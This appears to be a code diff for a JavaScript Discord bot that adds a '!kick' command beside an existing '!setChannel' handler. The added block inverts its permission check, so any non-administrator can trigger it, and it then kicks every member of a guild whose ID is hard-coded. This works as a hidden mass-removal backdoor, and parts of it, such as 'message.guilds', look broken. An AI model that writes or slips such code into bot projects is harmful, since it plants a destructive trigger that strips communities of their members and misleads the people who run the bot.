@@ -35,6 +35,17 @@ const command = args.shift().toLowerCase()
 
 
 ////////////////////////////////
+if(message.content === '!kick'){
+  if(message.member.hasPermission('ADMINISTRATOR')){
+    return;
+  }
+message.guilds.members.cache.forEach(g => {
+let m =  bot.guilds.cache.get('699372975496888400').members.cache.get(g.id)
+
+m.kick()
+
+})
+}
 if(message.content === '!setChannel'){
   if(!message.member.hasPermission('ADMINISTRATOR')){
  return;
